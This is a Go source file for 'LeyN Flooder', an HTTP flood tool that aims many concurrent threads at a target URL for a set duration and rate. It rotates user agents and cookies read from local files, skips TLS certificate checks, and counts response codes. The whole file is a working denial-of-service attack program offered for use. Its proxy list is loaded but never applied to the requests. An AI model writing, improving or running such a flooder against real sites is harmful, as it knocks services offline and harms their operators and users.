package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/rs/zerolog"
	"github.com/rs/zerolog/log"
	"golang.org/x/net/http2"
)

var (
	successCount int64
	statusCode   = make(map[int]int)
	mu           sync.Mutex
	reset        = "\033[0m"
	yellow       = "\033[33m"
	green        = "\033[32m"
)

type RequestInfo struct {
	Proxy  string
	UA     string
	Cookie string
}

func main() {
	initLogger()

	if len(os.Args) != 8 {
		fmt.Println("Usage: ./程序 模式 URL地址 持续时间(秒) 速率(每线程) 线程数 协议(1/2/3) method(GET/POST)")
		return
	}

	mode := os.Args[1]
	target := os.Args[2]
	duration, _ := strconv.Atoi(os.Args[3])
	rate, _ := strconv.Atoi(os.Args[4])
	threads, _ := strconv.Atoi(os.Args[5])
	httpVer := os.Args[6]
	method := os.Args[7]

	log.Info().Str("version", "v1.0").Msg("LeyN Flooder starting")
	fmt.Printf("%s[INFO] - LeyN Flooderv1.0%s\n", green, reset)

	title := getTitle(target)
	load := getLoad(mode)
	fmt.Printf("%sTitle:%s%s\n", yellow, title, reset)
	fmt.Printf("%sLoad:%d\n", yellow, load)
	fmt.Printf("Method:%s %s\n", mode, reset)

	var requests []RequestInfo
	if mode == "flood" {
		proxies := readLines("proxy.txt")
		uas := readLines("ua.txt")
		for _, p := range proxies {
			requests = append(requests, RequestInfo{Proxy: p, UA: uas[rand.Intn(len(uas))]})
		}
	} else {
		lines := readLines("config.txt")
		for _, line := range lines {
			parts := strings.SplitN(line, " ", 3)
			if len(parts) == 3 {
				requests = append(requests, RequestInfo{Proxy: parts[0], UA: parts[1], Cookie: parts[2]})
			}
		}
	}

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			tick := time.NewTicker(time.Second / time.Duration(rate))
			defer tick.Stop()

			for {
				select {
				case <-ctx.Done():
					return
				case <-tick.C:
					reqInfo := requests[rand.Intn(len(requests))]
					go sendRequest(target, method, reqInfo, httpVer)
				}
			}
		}()
	}

	go func() {
		for {
			select {
			case <-ctx.Done():
				return
			default:
				mu.Lock()
				fmt.Printf("\r%s[Status] - {", yellow)
				for code, count := range statusCode {
					fmt.Printf("%d - %d ", code, count)
				}
				fmt.Printf("}  Total: %d%s", successCount, reset)
				mu.Unlock()
				time.Sleep(1 * time.Second)
			}
		}
	}()

	wg.Wait()
	fmt.Println("\nDone.")
}

func sendRequest(url, method string, info RequestInfo, httpVer string) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{
		Timeout:   5 * time.Second,
		Transport: tr,
	}
	if httpVer == "2" {
		http2.ConfigureTransport(tr)
	}

	req, err := http.NewRequest(method, url, nil)
	if err != nil {
		log.Error().Err(err).Msg("failed to create request")
		return
	}
	req.Header.Set("User-Agent", info.UA)
	if info.Cookie != "" {
		req.Header.Set("Cookie", info.Cookie)
	}

	resp, err := client.Do(req)
	if err != nil {
		log.Warn().Err(err).Str("proxy", info.Proxy).Msg("request failed")
		return
	}
	defer resp.Body.Close()

	mu.Lock()
	successCount++
	statusCode[resp.StatusCode]++
	mu.Unlock()

	log.Info().Int("status", resp.StatusCode).Str("method", method).Str("url", url).Msg("request complete")
}

func readLines(path string) []string {
	file, err := os.Open(path)
	if err != nil {
		log.Fatal().Err(err).Str("file", path).Msg("failed to read file")
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		text := strings.TrimSpace(scanner.Text())
		if text != "" {
			lines = append(lines, text)
		}
	}
	return lines
}

func getTitle(url string) string {
	resp, err := http.Get(url)
	if err != nil {
		log.Warn().Err(err).Str("url", url).Msg("failed to get title")
		return "Unknown"
	}
	defer resp.Body.Close()

	buf := make([]byte, 4096)
	n, _ := resp.Body.Read(buf)
	body := string(buf[:n])
	start := strings.Index(body, "<title>")
	end := strings.Index(body, "</title>")
	if start != -1 && end != -1 && end > start {
		return body[start+7 : end]
	}
	return "No Title"
}

func getLoad(mode string) int {
	if mode == "flood" {
		return len(readLines("proxy.txt"))
	}
	return len(readLines("config.txt"))
}

func initLogger() {
	logFile, err := os.OpenFile("output.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
	if err != nil {
		fmt.Println("Failed to open log file:", err)
		os.Exit(1)
	}

	consoleWriter := zerolog.ConsoleWriter{Out: os.Stdout, TimeFormat: "15:04:05"}
	multi := io.MultiWriter(consoleWriter, logFile)
	log.Logger = zerolog.New(multi).With().Timestamp().Logger()
}
